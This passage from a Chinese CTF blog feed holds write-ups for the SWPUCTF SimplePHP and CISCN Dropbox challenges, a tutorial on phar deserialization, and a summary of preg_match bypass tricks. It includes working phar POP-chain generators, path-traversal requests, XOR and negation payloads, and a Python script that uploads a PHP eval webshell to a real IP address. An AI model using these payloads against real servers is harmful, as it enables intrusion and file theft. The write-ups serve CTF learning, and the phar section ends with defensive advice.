alt="image-20211107221800425"></p><p>好了，上面我们都是逆推，现在我们可以理一下pop链的顺序。</p><p>调用C1e4r()中的魔术方法__destruct  ——-    调用Show()中的 toString()  ———     传入Test调用不存在的属性从而调用 get</p><p>pop链代码如下:</p><pre><code class="php"> &lt;?phpclass C1e4r&#123;    public $test;    public $str;&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $file;    public $params;&#125;$a = new C1e4r();$b = new Show();$c = new Test();$a-&gt;str = $b;$b-&gt;str[&#39;str&#39;] = $c; //因为这里会调用source,从而会调用下边的source，所以下边的params也要接受$source$this-&gt;params[$source] = &#39;/var/www/html/f1ag.php&#39;;@unlink(&quot;sakura.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;sakura.txt&quot;, &quot;sakura&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>放在本地环境，访问，会生成一个sakura.phar文件</p><p>发现无法上传，将后缀改为.gif</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223436308.png" alt="image-20211107223436308"></p><p>上传后。</p><p>访问</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/upload%E5%8F%AF%E4%BB%A5%E8%8E%B7%E5%BE%97%E6%96%87%E4%BB%B6%E5%90%8D">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/upload可以获得文件名</a></p><p>然后利用phar解析</p><p><a href="http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=phar://upload/c8875103fcefc5560e4783a36e5faa18.jpg">http://a81afb6c-5cd8-4138-ab47-82856e1ae1b1.node4.buuoj.cn:81/file.php?file=phar://upload/c8875103fcefc5560e4783a36e5faa18.jpg</a></p><p>获得flag</p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223535835.png" alt="image-20211107223535835"></p><p><img src="/2021/11/07/SWPUCTF-2018-SimplePHP-0x50-0x5F/image-20211107223555802.png" alt="image-20211107223555802"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
            <tag> phar协议 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 华北赛区 Day1 Web1 Dropbox _0x41-0x4F</title>
      <link href="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/"/>
      <url>/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/</url>
      
        <content type="html"><![CDATA[<p>题目给出的是一个登录框，并且有注册操作</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005613695.png" alt="image-20211028005613695"></p><p>我们可以先注册个账号登录下</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005651708.png" alt="image-20211028005651708"></p><p>有上传文件的功能，尝试文件上传，发现写死了，只允许图片上传。</p><p>那我们先上传个图片看一看</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028005810078.png" alt="image-20211028005810078"></p><p>增加了两个功能，下载和删除</p><p>抓包来看一看</p><pre><code>POST /download.php HTTP/1.1Host: dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencoded; charset=UTF-8X-Requested-With: XMLHttpRequestContent-Length: 26Origin: http://dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81Connection: closeReferer: http://dffb1d8a-96e3-494b-af51-5369fad440d9.node4.buuoj.cn:81/index.phpCookie: UM_distinctid=17ba73558f3490-0c95ed277ed4498-4c3f217f-144000-17ba73558f4710; PHPSESSID=ad225e350fb42f426122effecd7c8b7cfilename=w5w.jpg</code></pre><p>这里有个关键点filename=w5w.jpg，我们可以尝试将w5w.jpg改为别的文件名称</p><p>首先改为 ../../index.php</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011042791.png" alt="image-20211028011042791"></p><p>成功读取到了index.php的源码。</p><p>这时候尝试盲猜路径读取flag，并没有什么结果。那就读取下其他源码看一看吧</p><p>依次读取了</p><p>index.php,download.php,delete.php,class.php</p><p>index.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;?&gt;&lt;?phpinclude &quot;class.php&quot;;$a = new FileList($_SESSION[&#39;sandbox&#39;]);$a-&gt;Name();$a-&gt;Size();?&gt;</code></pre><p>这个里面没有什么有价值的东西</p><p>class.php</p><pre><code class="php">&lt;?phperror_reporting(0);$dbaddr = &quot;127.0.0.1&quot;;$dbuser = &quot;root&quot;;$dbpass = &quot;root&quot;;$dbname = &quot;dropbox&quot;;$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);class User &#123;    public $db;    public function __construct() &#123;        global $db;        $this-&gt;db = $db;    &#125;    public function user_exist($username) &#123;        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;store_result();        $count = $stmt-&gt;num_rows;        if ($count === 0) &#123;            return false;        &#125;        return true;    &#125;    public function add_user($username, $password) &#123;        if ($this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password = sha1($password . &quot;SiAchGHmFx&quot;);        $stmt = $this-&gt;db-&gt;prepare(&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;);        $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);        $stmt-&gt;execute();        return true;    &#125;    public function verify_user($username, $password) &#123;        if (!$this-&gt;user_exist($username)) &#123;            return false;        &#125;        $password = sha1($password . &quot;SiAchGHmFx&quot;);        $stmt = $this-&gt;db-&gt;prepare(&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;);        $stmt-&gt;bind_param(&quot;s&quot;, $username);        $stmt-&gt;execute();        $stmt-&gt;bind_result($expect);        $stmt-&gt;fetch();        if (isset($expect) &amp;&amp; $expect === $password) &#123;            return true;        &#125;        return false;    &#125;    public function __destruct() &#123;        $this-&gt;db-&gt;close();    &#125;&#125;class FileList &#123;    private $files;    private $results;    private $funcs;    public function __construct($path) &#123;        $this-&gt;files = array();        $this-&gt;results = array();        $this-&gt;funcs = array();        $filenames = scandir($path);        $key = array_search(&quot;.&quot;, $filenames);        unset($filenames[$key]);        $key = array_search(&quot;..&quot;, $filenames);        unset($filenames[$key]);        foreach ($filenames as $filename) &#123;            $file = new File();            $file-&gt;open($path . $filename);            array_push($this-&gt;files, $file);            $this-&gt;results[$file-&gt;name()] = array();        &#125;    &#125;    public function __call($func, $args) &#123;        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) &#123;            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();        &#125;    &#125;    public function __destruct() &#123;        $table = &#39;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;        $table .= &#39;&lt;thead&gt;&lt;tr&gt;&#39;;        foreach ($this-&gt;funcs as $func) &#123;            $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;/th&gt;&#39;;        &#125;        $table .= &#39;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#39;;        $table .= &#39;&lt;/thead&gt;&lt;tbody&gt;&#39;;        foreach ($this-&gt;results as $filename =&gt; $result) &#123;            $table .= &#39;&lt;tr&gt;&#39;;            foreach ($result as $func =&gt; $value) &#123;                $table .= &#39;&lt;td class=&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;/td&gt;&#39;;            &#125;            $table .= &#39;&lt;td class=&quot;text-center&quot; filename=&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#39;;            $table .= &#39;&lt;/tr&gt;&#39;;        &#125;        echo $table;    &#125;&#125;class File &#123;    public $filename;    public function open($filename) &#123;        $this-&gt;filename = $filename;        if (file_exists($filename) &amp;&amp; !is_dir($filename)) &#123;            return true;        &#125; else &#123;            return false;        &#125;    &#125;    public function name() &#123;        return basename($this-&gt;filename);    &#125;    public function size() &#123;        $size = filesize($this-&gt;filename);        $units = array(&#39; B&#39;, &#39; KB&#39;, &#39; MB&#39;, &#39; GB&#39;, &#39; TB&#39;);        for ($i = 0; $size &gt;= 1024 &amp;&amp; $i &lt; 4; $i++) $size /= 1024;        return round($size, 2).$units[$i];    &#125;    public function detele() &#123;        unlink($this-&gt;filename);    &#125;    public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;&#125;?&gt;</code></pre><p>很多函数，最关键的是我们发现了 file_get_contents,这应该是题目的突破点</p><p>download.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);chdir($_SESSION[&#39;sandbox&#39;]);$file = new File();$filename = (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, &quot;flag&quot;) === false) &#123;    Header(&quot;Content-type: application/octet-stream&quot;);    Header(&quot;Content-Disposition: attachment; filename=&quot; . basename($filename));    echo $file-&gt;close();&#125; else &#123;    echo &quot;File not exist&quot;;&#125;?&gt;</code></pre><p>这里可以看到flag被过滤了，所以我们是无法直接读取flag的</p><p>delete.php</p><pre><code class="php">&lt;?phpsession_start();if (!isset($_SESSION[&#39;login&#39;])) &#123;    header(&quot;Location: login.php&quot;);    die();&#125;if (!isset($_POST[&#39;filename&#39;])) &#123;    die();&#125;include &quot;class.php&quot;;chdir($_SESSION[&#39;sandbox&#39;]);$file = new File();$filename = (string) $_POST[&#39;filename&#39;];if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;    $file-&gt;detele();    Header(&quot;Content-type: application/json&quot;);    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);    echo json_encode($response);&#125; else &#123;    Header(&quot;Content-type: application/json&quot;);    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);    echo json_encode($response);&#125;?&gt;</code></pre><p>存在任意文件下载漏洞，相应也存在任意文件删除漏洞。这里的意思不过返回True与False，没有发现什么有用的地方。</p><p>接下来我们来审计一下代码。</p><p>利用点：</p><pre><code class="php">public function close() &#123;        return file_get_contents($this-&gt;filename);    &#125;</code></pre><p>看一下哪些地方调用了close函数</p><p>download.php中的</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011750225.png" alt="image-20211028011750225"></p><p>class.php的user类里面存在</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011814557.png" alt="image-20211028011814557"></p><p>这里执行的实际是关闭数据库的操作，但是有趣的是它和我们需要调用的函数重名。</p><p>download.php存在过滤，无法使用，所以我们尝试使用class.php中的魔术方法__destruct()来调用</p><p>如何调用__destruct()魔术方法呢，也就是如何调用对象呢，必须使用反序列化</p><p>但是整个代码中并没有出现过unserialize()这个函数，所以我们并不能直接进行序列化。</p><p>这时候就可以利用phar://伪协议，可以不依赖unserialize()直接进行反序列化操作.</p><p>关于phar的讲解可以看另外一篇博客：</p><p><a href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p><p>审计代码，我们可以发现一个很有趣的魔术方法：</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028012434528.png" alt="image-20211028012434528"></p><p>它在什么时候调用呢？</p><p>这个方法用来监视一个对象中的其它方法。如果你试着调用一个对象中不存在的方法，__call 方法将会被自动调用</p><p>这里__call的代码的意思就是如果调用的对象不存在，就会把这个函数写入$this-&gt;funcs,并且遍历文件，让每一个文件执行一遍这个函数。</p><p>因此我们的思路就清晰了一点。</p><p>首先反序列化一个类，这个类不存在close()方法(如果存在的话就不需要这么复杂了)，然后对这个类调用close()方法，因为它不存在，所以会调用__call魔术方法，call魔术方法就可以调用close方法，从而完成file_get_contents函数的利用。</p><p>所以操作就是：</p><p>反序列化$user</p><p>调用完成，对象被销毁时，调用函数__destruct魔术方法</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028011814557.png" alt="image-20211028011814557"></p><p>使$user -&gt; db = FileList()</p><p>FileList这个类调用close(),不存在，调用__call方法，调用close()</p><p>接下来就可以来构建pop链：</p><pre><code class="php">&lt;?phpclass User &#123;public $db;public function __construct() &#123;        $this-&gt;db = new FileList();    &#125;&#125;class FileList &#123;        private $files;    private $results;    private $funcs;    public function __construct() &#123;        $this-&gt;files = array(new File());        $this-&gt;results = array();        $this-&gt;funcs = array();    &#125;&#125;class File &#123;    public $filename = &#39;/flag.txt&#39;;&#125;$user = new User;@unlink(&quot;sakura.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$phar-&gt;setMetadata($user); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;sakura.txt&quot;, &quot;sakura&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>运行得到sakura.phar文件，修改后缀为sakura.jpg，上传</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014454461.png" alt="image-20211028014454461"></p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014549020.png" alt="image-20211028014549020"></p><p>访问delete.php</p><p>注意为什么不访问download.php来实行攻击？</p><p>这里要注意一个细节：</p><p>download.php中存在</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014231785.png" alt="image-20211028014231785"></p><p>ini_set(“open_basedir”, getcwd() . “:/etc:/tmp”); 这个函数执行后，我们通过Web只能访问当前目录、/etc和/tmp三个目录，所以只能在delete.php中利用payload，而不是download.php，否则访问不到沙箱内的上传目录。</p><p>访问delete.php,使用phar进行反序列化，成功得到flag</p><p><img src="/2021/10/28/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox-0x41-0x4F/image-20211028014632248.png" alt="image-20211028014632248"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phar反序列化漏洞</title>
      <link href="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。<br> 这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。</p><h1 id="关于流包装"><a href="#关于流包装" class="headerlink" title="关于流包装"></a>关于流包装</h1><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br> 例如常见的</p><pre><code class="php">include(&#39;php://filter/read=convert.base64-encode/resource=index.php&#39;);include(&#39;data://text/plain;base64,xxxxxxxxxxxx&#39;);</code></pre><p><code>phar://</code>也是流包装的一种</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>phar由四个部分组成，分别是stub、manifest describing the  contents、 the file contents、 [optional] a signature for verifying Phar  integrity (phar file format only)</p><p>stub:标识作用，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件；</p><p>manifest describing the contents:其实可以理解为phar文件本质上是一种压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/d8f9d72a6059252d260b20a9a98db93d5bb5b918.jpeg" alt="img"></p><p> the file contents:这里指的是被压缩文件的内容；</p><p>[optional] a signature for verifying Phar integrity (phar file format only):签名，放在结尾；</p><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p><p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p><pre><code class="php">&lt;?phpclass TestObject &#123;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new TestObject();$o -&gt; data=&#39;sakura&#39;;$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>访问一下，发现同目录下生成了一个.phar后缀的文件(如果这步无法创建，请修改php.ini的配置，设置phar.readonly = off 并去掉前面的分号)</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027213811961.png" alt="image-20211027213811961"></p><p>打开：</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215216183.png" alt="image-20211027215216183"></p><p>发现写入的内容已经被序列化。</p><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20180908164943-2151deae-b344-1.png" alt="img"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>phar_fan.php</p><pre><code class="php">&lt;?phpclass TestObject&#123;    function __destruct()    &#123;        echo $this -&gt; data;   // TODO: Implement __destruct() method.    &#125;&#125;include(&#39;phar://phar.phar&#39;);?&gt;</code></pre><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215532641.png" alt="image-20211027215532641"></p><p>我们来简要说明下整个调用流程：</p><p>访问 phar_fun.php这个文件</p><p>执行incleude代码</p><p>解析phar文件</p><p>将里面的meta-data反序列化，在上述代码中也就是TestObject这个对象。</p><p>对象销毁，调用魔术方法__destruct()</p><p>执行echo语句完成攻击。</p><h1 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h1><p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><pre><code class="php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;sakura.phar&quot;);    $phar = new Phar(&quot;sakura.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头    $o = new TestObject();    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>然后调用phar://sakura.php</p><p>是一样的效果。</p><h1 id="漏洞的利用条件"><a href="#漏洞的利用条件" class="headerlink" title="漏洞的利用条件"></a>漏洞的利用条件</h1><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ol><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li><li>严格检查上传文件的内容，而不是只检查文件头。</li><li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>preg_match正则绕过总结</title>
      <link href="/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
      <url>/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>最近写题遇到了很多次pre_match函数，但并不是每次都可以绕过。于是想要把这个函数总结一下用法。我个人认为preg_match的绕过方法主要取决于其正则表达式的写法。</p><p>首先对正则表达式的常见符号解释一下。</p><p>/    /    是一种格式吧，正则表达式需要写在这个里面</p><p>^：匹配输入字符串的开始位置</p><p>$：匹配输入字符串的结束位置</p><h1 id="换行符绕过-0a"><a href="#换行符绕过-0a" class="headerlink" title="换行符绕过(%0a)"></a>换行符绕过(%0a)</h1><pre><code class="php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);$c = $_GET[&#39;c&#39;];if (preg_match(&#39;/^flag$/i&#39;, $c) &amp;&amp; $c !== &#39;flag&#39;) &#123;    echo $flag;&#125;else&#123;    echo &quot;nonono&quot;;&#125;</code></pre><p>由于pre_match这个函数是只能匹配一行的数据，所以我们可以用%0a(也就是换行符)来绕过。</p><p>这里是因为$会忽略换行符</p><p>因此本题我们传入?c=flag%0a  即可绕过</p><p>注意此时正则表达式的模式是: i</p><h1 id="利用数组绕过"><a href="#利用数组绕过" class="headerlink" title="利用数组绕过"></a>利用数组绕过</h1><p> preg_match只能处理字符串，当传入的subject是数组时会返回false</p><h1 id="5c绕过"><a href="#5c绕过" class="headerlink" title="%5c绕过"></a>%5c绕过</h1><pre><code class="php">&lt;?php show_source(__FILE__); $key = &quot;bad&quot;; extract($_POST);        // 使用POST接收参数 if($key === &#39;bad&#39;)&#123;        // $key 与 &#39;bad&#39; 进行比较，值不相同时才可以继续运行代码    die(&#39;badbad!!!&#39;); &#125; $act = @$_GET[&#39;act&#39;];    // 获得 act 参数 $arg = @$_GET[&#39;arg&#39;];    // 获得 arg 参数 if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$act)) &#123;    // 针对act参数进行过滤    echo &#39;check&#39;; &#125; else &#123;    $act($arg,&#39;&#39;);        // 动态调用 &#125; echo &#39;666&#39;;</code></pre><pre><code>/i不区分大小写/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]/D如果使用$限制结尾字符,则不允许结尾有换行;</code></pre><p>这里存在/s和/D因此它会匹配到换行，%0a因此就无法绕过。这时候就可以使用%5c</p><h1 id="preg-match-“-e”-注：php版本需要小于5-5-0"><a href="#preg-match-“-e”-注：php版本需要小于5-5-0" class="headerlink" title="preg_match(“/^$/e”) (注：php版本需要小于5.5.0)"></a>preg_match(“/^$/e”) (注：php版本需要小于5.5.0)</h1><pre><code class="php">&lt;?highlight_file(__FILE__);echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);?&gt;</code></pre><p>payload=xx?h=phpinfo();</p><h1 id="PHP利用PCRE回溯次数限制绕过某些安全限制"><a href="#PHP利用PCRE回溯次数限制绕过某些安全限制" class="headerlink" title="PHP利用PCRE回溯次数限制绕过某些安全限制"></a>PHP利用PCRE回溯次数限制绕过某些安全限制</h1><p>poc</p><pre><code class="php">import requestsfrom io import BytesIOfiles = &#123;  &#39;file&#39;: BytesIO(b&#39;aaa&lt;?php eval($_POST[txt]);//&#39; + b&#39;a&#39; * 1000000)&#125;res = requests.post(&#39;http://51.158.75.42:8088/index.php&#39;, files=files, allow_redirects=False)print(res.headers)</code></pre><p>payload:?a=ssss………..省略n个字符，突破100万</p><h1 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h1><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;        $code=$_GET[&#39;code&#39;];            if(strlen($code)&gt;40)&#123;                    die(&quot;This is too Long.&quot;);                    &#125;            if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                    die(&quot;NO.&quot;);                    &#125;            @eval($code);&#125;else&#123;        highlight_file(__FILE__);&#125;highlight_file(__FILE);// ?&gt;</code></pre><p>可以使用各种特殊字符的异或构造出字母和数字</p><p>脚本：</p><pre><code class="php">str = r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;/&quot;for i in range(0, len(str)):    for j in range(0, len(str)):        a = ord(str[i])^ord(str[j])        print(str[i] + &#39; ^ &#39; + str[j] + &#39; is &#39; + chr(a))</code></pre><p>payload:</p><pre><code class="php">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=phpinfo</code></pre><h1 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h1><p>把getFlag取反然后URL编码： </p><pre><code class="php"> &lt;?php echo urlencode(~&quot;getFlag&quot;); </code></pre><p>–&gt; %98%9A%8B%B9%93%9E%98</p><p>依据这个我们可以构造payload: </p><pre><code class="php"> ?code=$_=~%98%9A%8B%B9%93%9E%98;$_(); </code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> preg_match </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF 2019枯燥的抽奖_0x30-0x3f</title>
      <link href="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/"/>
      <url>/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/</url>
      
